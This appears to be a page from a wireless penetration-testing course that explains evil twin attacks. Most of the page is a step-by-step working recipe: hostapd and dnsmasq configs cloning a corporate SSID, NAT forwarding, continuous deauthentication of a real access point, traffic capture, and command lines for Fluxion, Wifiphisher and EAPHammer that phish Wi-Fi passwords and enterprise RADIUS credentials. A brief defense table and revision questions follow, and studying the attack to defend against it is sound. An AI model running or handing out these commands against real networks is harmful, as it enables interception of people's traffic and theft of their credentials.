# Evil Twin Attacks

## Unit 7 - Topic 3 | Wireless Network Testing

---

## Overview

An **evil twin** is a rogue access point that impersonates a legitimate wireless network. Victims connect to the attacker's AP instead of the real one, routing all traffic through the attacker and enabling credential capture, session hijacking, and payload delivery.

---

## 1. How Evil Twin Works

```
EVIL TWIN ATTACK FLOW:

LEGITIMATE AP:                    EVIL TWIN (Attacker):
SSID: CORP-WIFI                   SSID: CORP-WIFI
Channel: 6                        Channel: 6
BSSID: AA:BB:CC:DD:EE:FF         BSSID: 11:22:33:44:55:66
Signal: -70 dBm                   Signal: -40 dBm (STRONGER!)

ATTACK STEPS:
1. Clone target SSID + settings
2. Broadcast stronger signal than real AP
3. Deauth clients from real AP
4. Clients auto-reconnect to STRONGER signal (evil twin)
5. All traffic routes through attacker

┌──────────┐                    ┌──────────────┐
│  Victim  │ ─── connects ───→ │  EVIL TWIN   │
│  Device  │ ←── internet ──── │  (Attacker)  │
└──────────┘                    └──────┬───────┘
                                       │
                                ┌──────┴───────┐
                                │   Internet   │
                                │  (via eth0)  │
                                └──────────────┘
```

---

## 2. Evil Twin with hostapd

```bash
# === MANUAL EVIL TWIN SETUP ===

# STEP 1: Create hostapd config
cat > evil_twin.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=CORP-WIFI
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
# For WPA2:
# wpa=2
# wpa_passphrase=password123
# wpa_key_mgmt=WPA-PSK
# rsn_pairwise=CCMP
EOF

# STEP 2: Start AP
sudo hostapd evil_twin.conf

# STEP 3: Configure DHCP (dnsmasq)
cat > dnsmasq.conf << 'EOF'
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
EOF

sudo ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
sudo dnsmasq -C dnsmasq.conf

# STEP 4: Enable NAT
sudo iptables --flush
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# STEP 5: Deauth clients from real AP
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan1mon
# -a: Real AP BSSID
# 0: Continuous deauth

# STEP 6: Capture traffic
sudo tcpdump -i wlan0 -w evil_twin_capture.pcap
```

---

## 3. Evil Twin Frameworks

```bash
# === FLUXION (Automated Evil Twin + Captive Portal) ===
sudo fluxion
# Menu-driven:
# 1. Scan for target networks
# 2. Select target AP
# 3. Choose attack: Captive Portal
# 4. Clones AP + creates phishing portal
# 5. Victim enters WiFi password on fake portal
# 6. Password captured + verified against handshake!

# === WIFIPHISHER ===
sudo wifiphisher
# Automated evil twin + social engineering
# Built-in phishing scenarios:
# ├── Firmware Upgrade Page
# ├── Network Manager Connect
# ├── OAuth Login Page
# └── Browser Plugin Update

# Custom scenario:
sudo wifiphisher -aI wlan0 -eI wlan1 \
  --essid "CORP-WIFI" -p firmware-upgrade

# === EAPHAMMER (Enterprise Evil Twin) ===
# For WPA2-Enterprise (802.1X) networks:
sudo eaphammer --bssid AA:BB:CC:DD:EE:FF --essid CORP-WIFI \
  --channel 6 --interface wlan0 --auth wpa-eap \
  --creds

# Captures RADIUS credentials!
# EAP types: PEAP, EAP-TTLS, EAP-TLS

# === AIRGEDDON ===
sudo airgeddon
# All-in-one wireless auditing framework
# Evil twin, WPA cracking, WPS, DoS
```

---

## 4. Captive Portal Attack

```
CAPTIVE PORTAL EVIL TWIN:

1. Victim connects to evil twin (open network)
2. All HTTP redirected to captive portal
3. Portal shows: "Enter WiFi password to continue"
4. Victim enters WPA password
5. Attacker captures password
6. Verifies against captured handshake
7. If correct → grants internet access

┌──────────┐         ┌───────────────┐
│  Victim  │ ──1──→  │  Evil Twin    │
│          │ ←─2──  │  (Open AP)    │
│  Enters  │         │               │
│  WiFi    │ ──3──→  │ ┌───────────┐│
│  password│         │ │  Captive  ││
│          │         │ │  Portal   ││
└──────────┘         │ └───────────┘│
                     └───────────────┘

TOOLS THAT AUTOMATE THIS:
├── Fluxion
├── Wifiphisher
├── Airgeddon
└── WiFi-Pumpkin3
```

---

## 5. Detection and Defense

| Defense | Description |
|---------|-------------|
| **802.1X (Enterprise)** | Certificate-based auth defeats simple evil twin |
| **WIDS/WIPS** | Wireless Intrusion Detection/Prevention |
| **Certificate pinning** | Client validates AP certificate |
| **VPN** | Encrypts traffic even on evil twin |
| **User training** | Don't enter passwords on WiFi portals |
| **AP monitoring** | Detect duplicate SSIDs |
| **MAC allowlisting** | Only known APs on management side |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Evil twin** | Rogue AP cloning legitimate network |
| **Stronger signal** | Clients prefer stronger AP |
| **Captive portal** | Phish WiFi password from users |
| **Fluxion** | Automated evil twin + portal + verification |
| **EAPHammer** | Evil twin for WPA2-Enterprise |
| **Defense** | 802.1X certs, WIDS, VPN |

---

## Quick Revision Questions

1. **How does an evil twin attack work?**
2. **Why do clients connect to the evil twin instead of the real AP?**
3. **What is a captive portal in the context of evil twin attacks?**
4. **How does Fluxion verify captured WiFi passwords?**
5. **What defenses prevent evil twin attacks?**

---

[← Previous: WPA/WPA2 Testing](02-wpa-wpa2-testing.md) | [Next: Wireless Client Attacks →](04-wireless-client-attacks.md)

---

*Unit 7 - Topic 3 of 6 | [Back to README](../README.md)*
